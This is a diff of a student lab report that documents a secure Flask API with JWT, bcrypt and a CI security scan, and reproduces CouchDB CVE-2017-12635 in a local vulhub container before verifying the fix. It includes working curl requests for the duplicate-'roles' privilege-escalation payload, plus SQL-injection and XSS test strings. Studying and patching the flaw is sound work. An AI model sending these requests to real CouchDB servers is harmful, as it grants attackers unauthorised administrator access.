@@ -1,142 +1,71 @@
-# 信息安全实验一
-
-## 基于 Flask 的安全 API 与 CVE-2017-12635 复现
+# 实验一：安全 REST API 与 CVE-2017-12635 复现
 
 | 项目 | 内容 |
 |---|---|
+| 实验编号 | Work 1 |
 | 变体 | CVE-2017-12635 |
 | 姓名 | Guo Ruihao |
 | HDU 学号 | 23320309 |
-| 小组 | 无 |
-| 日期 | 2026-10-20 |
 | 仓库 | <https://github.com/zhangyu7777777/InformationSecurity_23320309> |
+| 成功流水线 | <https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39363497176> |
 
-## 实验目的
+## 1. 实验目的
 
-1. 用 Flask 写一个简单的 REST API。
-2. 实现登录、JWT 验证和 bcrypt 密码加密。
-3. 防 SQL 注入和 XSS。
-4. 用 GitHub Actions 自动运行 Bandit 和 pip-audit。
-5. 在 Docker 里复现 CVE-2017-12635，并验证修复。
+用 Flask 实现一个需要 JWT 登录的 REST API，防止 SQL 注入和 XSS；用
+GitHub Actions 运行 Bandit 和 pip-audit；用 Docker 复现
+CVE-2017-12635 并验证修复。
 
-## 一、文件说明
+## 2. 项目与 API
 
-```text
-app.py                  后端代码
-requirements.txt        需要安装的包
-README.md               实验说明和报告
-.github/workflows/      GitHub Actions
-screenshots/            实验截图
-```
-
-## 二、运行方法
-
-先进入项目文件夹：
+代码在 `app.py`，数据库用 SQLite。运行：
 
 ```powershell
 cd "C:\Users\29611\Desktop\信息安全\lab\secure-api"
-
-# 如果之前运行过旧版本，先删掉旧数据库
-Remove-Item app.db, lab.db -ErrorAction SilentlyContinue
-
 py -3 -m venv .venv
 .\.venv\Scripts\python.exe -m pip install -r requirements.txt
 .\.venv\Scripts\python.exe app.py
 ```
 
-程序运行在 `http://127.0.0.1:5000`。
+首次运行会创建两个测试用户：`alice / 123456`（admin）和
+`bob / 123456`（user）。
 
-### 常见问题
-
-1. 提示 `Activate.ps1 cannot be loaded`：不用激活虚拟环境，直接运行
-   `.\.venv\Scripts\python.exe app.py`。
-2. 提示 `No module named 'flask'`：说明运行的是系统 Python。请使用
-   `.\.venv\Scripts\python.exe`，不要直接输入 `python`。
-3. 访问 `/api/data` 报 500，或者提示 `no such column: posts.user_id`：
-   删除旧的 `app.db` / `lab.db`，再重新运行。
-4. 提示 5000 端口被占用：关掉之前启动的 Python 进程，或者把 `app.py`
-   最后一行的端口改成 `5001`。
-
-数据库用 SQLite，第一次运行会自动建表，并创建两个测试用户：
-
-| 用户名 | 密码 | 角色 |
+| 方法 | 路径 | 说明 |
 |---|---|---|
-| alice | 123456 | admin |
-| bob | 123456 | user |
+| POST | `/auth/login` | 登录，返回 JWT |
+| GET | `/api/data` | 获取数据，需要 token |
+| POST | `/api/data` | 新增数据，需要 token |
 
-## 三、接口
-
-Windows 用户注意：cmd.exe 不能用单引号包 JSON，否则 Flask 会返回
-`400 Bad Request`。下面分别给出 cmd 和 PowerShell 的写法。
-
-### 1. 登录
-
-在 cmd.exe 里（注意 JSON 里的双引号要加反斜杠）：
+登录：
 
 ```bat
 curl.exe -X POST http://127.0.0.1:5000/auth/login -H "Content-Type: application/json" -d "{\"login\":\"alice\",\"password\":\"123456\"}"
 ```
 
-在 PowerShell 里：
-
-```powershell
-Invoke-RestMethod -Uri http://127.0.0.1:5000/auth/login -Method Post -ContentType "application/json" -Body '{"login":"alice","password":"123456"}'
-```
-
-返回：
-
-```json
-{"token":"..."}
-```
-
-### 2. 获取数据
+获取数据（把 `TOKEN` 换成登录返回的 token）：
 
 ```bat
-curl.exe http://127.0.0.1:5000/api/data -H "Authorization: Bearer 这里填token"
+curl.exe http://127.0.0.1:5000/api/data -H "Authorization: Bearer TOKEN"
 ```
 
-不带 token 会返回 401。加 `?q=关键词` 可以搜索。
+不带 token 时返回 401。
 
-### 3. 添加数据
-
-在 cmd.exe 里：
+新增数据：
 
 ```bat
-curl.exe -X POST http://127.0.0.1:5000/api/data -H "Authorization: Bearer 这里填token" -H "Content-Type: application/json" -d "{\"title\":\"标题\",\"body\":\"内容\"}"
+curl.exe -X POST http://127.0.0.1:5000/api/data -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d "{\"title\":\"test\",\"body\":\"hello\"}"
 ```
 
-在 PowerShell 里：
+## 3. 安全措施
 
-```powershell
-Invoke-RestMethod -Uri http://127.0.0.1:5000/api/data -Method Post -Headers @{Authorization="Bearer 这里填token"} -ContentType "application/json" -Body '{"title":"标题","body":"内容"}'
-```
+- **SQL 注入**：所有 SQL 都用 `?` 占位符，例如
+  `SELECT * FROM users WHERE username = ?`，不拼接用户输入。
+- **XSS**：返回数据前用 `html.escape()` 转义标题、正文和用户名。
+- **认证**：密码用 bcrypt 哈希后存储；登录返回 HS256 JWT；两个受保护
+  接口都使用 `@login_required` 验证 token，缺失或无效时返回 401。
 
-### 测试结果
+## 4. CI/CD
 
-```text
-登录 alice/123456              -> 200，返回 token
-不带 token 访问 /api/data      -> 401
-带 token 访问 /api/data        -> 200
-q=' OR 1=1 --                  -> []
-提交 <script>alert(1)</script> -> 返回内容已转义
-```
-
-## 四、安全措施
-
-1. **SQL 注入**：SQL 里用 `?` 占位符，例如
-   `SELECT * FROM users WHERE username = ?`，不拼接用户输入。
-2. **XSS**：返回数据前用 `html.escape()` 转义。
-3. **密码**：用 bcrypt 加密后存数据库，不存明文。
-4. **登录**：登录成功后发 JWT，访问受保护接口要带
-   `Authorization: Bearer <token>`。token 用 HS256 验证。
-   两个受保护接口都加了 `@login_required`，会先检查 token。
-
-我测试了 SQL 注入字符串 `' OR 1=1 --`，搜索结果是空列表；提交
-`<script>alert(1)</script>` 后，返回内容里没有可执行的 `<script>`。
-
-## 五、CI
-
-GitHub Actions 每次 push 会自动运行：
+`.github/workflows/ci.yml` 在每次 push 时运行：
 
 ```text
 python -c "import app"
@@ -144,39 +73,24 @@ bandit app.py
 pip-audit -r requirements.txt
 ```
 
-结果：
+结果：Bandit 无问题，pip-audit 无已知漏洞。报告作为
+`security-reports` artifact 上传。
 
-```text
-Bandit: No issues identified
-pip-audit: No known vulnerabilities found
-```
-
-流水线地址：
-
-<https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39358191446>
+流水线：<https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39363497176>
 
 ![SAST 和 SCA 结果](screenshots/security-check.png)
 
-## 六、CVE-2017-12635
+![GitHub Actions](screenshots/ci-success.png)
 
-### 1. 漏洞简介
+## 5. CVE-2017-12635
 
-CVE-2017-12635 是 CouchDB 2.1.1 之前的权限提升漏洞。
+### 5.1 漏洞说明
 
-CouchDB 检查权限时用 Erlang 的 JSON 解析器，保存用户时用 JavaScript 的
-解析器。如果请求里有重复的 `roles` 键，两个解析器会得到不同的值：
+CVE-2017-12635 是 CouchDB 2.1.1 之前的权限提升漏洞。CouchDB 用 Erlang
+解析器检查权限，用 JavaScript 解析器保存用户。请求中出现重复的 `roles`
+键时，两个解析器看到的值不同，普通用户可以把自己创建成管理员。
 
-```json
-{
-  "roles": ["_admin"],
-  "roles": []
-}
-```
-
-权限检查看到第一个 `["_admin"]`，保存时看到第二个 `[]`，所以普通用户能
-把自己创建成管理员。
-
-### 2. 启动漏洞环境
+### 5.2 复现
 
 ```bash
 git clone --depth 1 https://github.com/vulhub/vulhub.git
@@ -184,10 +98,7 @@ cd vulhub/couchdb/CVE-2017-12635
 docker compose up -d
 ```
 
-服务地址是 `http://127.0.0.1:5984`。
-
-如果访问时返回 `404 Database does not exist`，说明 init 容器没有创建系统库，
-手动执行下面三条命令：
+如果返回 `404 Database does not exist`，手动创建系统库：
 
 ```bat
 curl.exe -X PUT http://admin:password@127.0.0.1:5984/_users
@@ -195,46 +106,21 @@ curl.exe -X PUT http://admin:password@127.0.0.1:5984/_replicator
 curl.exe -X PUT http://admin:password@127.0.0.1:5984/_global_changes
 ```
 
-Windows 下如果 init 容器报 `$'\r': command not found`，说明 `init.sh`
-是 CRLF 换行。用编辑器把它改成 LF，然后执行
-`docker compose restart initd`。
-
-### 3. 复现
-
-不需要下载 Postman。Postman 只是一个图形化的 HTTP 请求工具，和 curl 的
-作用一样；Windows 自带的 `curl.exe` 已经够用。
-
-先发第一个请求（正常设置管理员，应该被拒绝）：
+正常设置管理员角色，返回 403：
 
 ```bat
 curl.exe -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"password\":\"vulhub\"}"
 ```
 
-结果：
-
-```text
-403 Forbidden
-{"error":"forbidden","reason":"Only _admin may set roles"}
-```
-
-再发一个带两个 `roles` 的请求：
+使用重复 `roles`，返回 201：
 
 ```bat
 curl.exe -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"vulhub\"}"
 ```
 
-结果：
+登录后可以看到 `_admin` 角色：
 
-```text
-201 Created
-```
-
-如果返回 `409 Conflict`，说明这个用户已经存在，把请求里的 `vulhub` 换成
-另一个名字（例如 `poc123`）再试。
-
-登录新用户：
-
-```bash
+```bat
 curl.exe -u vulhub:vulhub http://127.0.0.1:5984/_session
 ```
 
@@ -242,85 +128,63 @@ curl.exe -u vulhub:vulhub http://127.0.0.1:5984/_session
 {"ok":true,"userCtx":{"name":"vulhub","roles":["_admin"]},...}
 ```
 
-再用这个用户创建数据库：
+![漏洞复现](screenshots/cve-before.png)
+
+### 5.3 根因分析
+
+这是两个 JSON 解析器对重复键的处理不一致。权限检查阶段读取第一个
+`roles`（`["_admin"]`），保存阶段读取最后一个 `roles`（`[]`），导致
+权限检查和实际保存的用户角色不一致。
+
+### 5.4 修复
+
+先停止漏洞环境：
 
 ```bash
-curl.exe -i -u vulhub:vulhub -X PUT http://127.0.0.1:5984/evil_db
-```
-
-返回 201，说明已经拿到管理员权限。
-
-### 4. 原因分析
-
-这个漏洞是**两个 JSON 解析器对重复键的处理不一致**。
-
-同一个请求，在权限检查阶段被解析成管理员，在保存阶段却被解析成普通用户。
-代码逻辑本身看起来没有问题，但两个组件对同一份数据的理解不同，最后就产生
-了权限绕过。
-
-### 5. 修复
-
-先把漏洞环境停掉：
-
-```bash
-cd vulhub/couchdb/CVE-2017-12635
 docker compose down
 ```
 
-直接用 CouchDB 2.1.1 的镜像启动一个修复版：
+使用 CouchDB 2.1.1：
 
 ```bash
 docker run -d --name couchdb-fixed -p 5985:5984 -e COUCHDB_USER=admin -e COUCHDB_PASSWORD=password couchdb:2.1.1
+```
 
+等待几秒后创建系统库：
+
+```bat
 curl.exe -X PUT http://admin:password@127.0.0.1:5985/_users
 ```
 
-修复版地址是 `http://127.0.0.1:5985`。
+修复方式是升级镜像版本，没有修改 Dockerfile 或 compose 文件，因此没有
+额外的 fix 文件夹。
 
-这次修复只是升级 CouchDB 镜像版本，没有修改 Dockerfile 或 compose 文件，
-所以不需要额外的 fix 文件夹。
+### 5.5 修复验证
 
-### 6. 修复验证
-
-再发同样的重复 `roles` 请求：
+重复 `roles` 请求仍返回 201，但登录后角色为空：
 
 ```bat
 curl.exe -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"vulhub\"}"
 ```
 
-2.1.1 仍然返回 201，但登录后角色是空的：
-
 ```bat
 curl.exe -u vulhub:vulhub http://127.0.0.1:5985/_session
 ```
 
-用这个用户创建数据库会返回 401：
+```json
+{"ok":true,"userCtx":{"name":"vulhub","roles":[]},...}
+```
+
+创建数据库返回 401：
 
 ```bat
 curl.exe -i -u vulhub:vulhub -X PUT http://127.0.0.1:5985/newdb
 ```
 
-普通用户注册仍然正常：
+普通用户注册仍返回 201：
 
 ```bat
 curl.exe -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:normaluser -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"normaluser\",\"roles\":[],\"password\":\"normalpass\"}"
 ```
 
-返回 201，登录后角色是 `[]`。说明修复后普通功能没有被破坏。
-
-## 七、截图
-
-![漏洞复现](screenshots/cve-before.png)
-
 ![修复验证](screenshots/cve-after.png)
-
-![GitHub Actions](screenshots/ci-success.png)
-
-## 八、总结
-
-这次实验让我练习了 Flask 写接口、JWT 登录、bcrypt 存密码，以及防 SQL 注入
-和 XSS。
-
-CVE 部分让我理解了：就算代码逻辑看起来没问题，不同组件对同一个输入的理解
-不一致，也可能造成权限绕过。修复时升级版本最直接，但升级后还要测试普通用户
-注册，确认功能没有被破坏。
